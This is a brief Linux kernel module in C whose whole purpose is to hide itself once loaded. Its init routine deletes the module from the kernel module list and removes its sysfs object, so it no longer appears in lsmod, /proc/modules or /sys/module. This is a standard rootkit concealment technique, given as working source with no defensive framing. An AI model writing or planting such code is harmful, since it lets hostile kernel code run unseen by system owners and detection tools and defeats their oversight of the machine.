#include <linux/module.h>
#include <linux/list.h>

MODULE_DESCRIPTION("Hiding module from list");
MODULE_AUTHOR("Thomas Lam");
MODULE_LICENSE("GPL");

static int __init module_hide(void)
{
	list_del(&THIS_MODULE->list);
	kobject_del(&THIS_MODULE->mkobj.kobj);
	list_del(&THIS_MODULE->mkobj.kobj.entry);
	return 0;
}

module_init(module_hide);
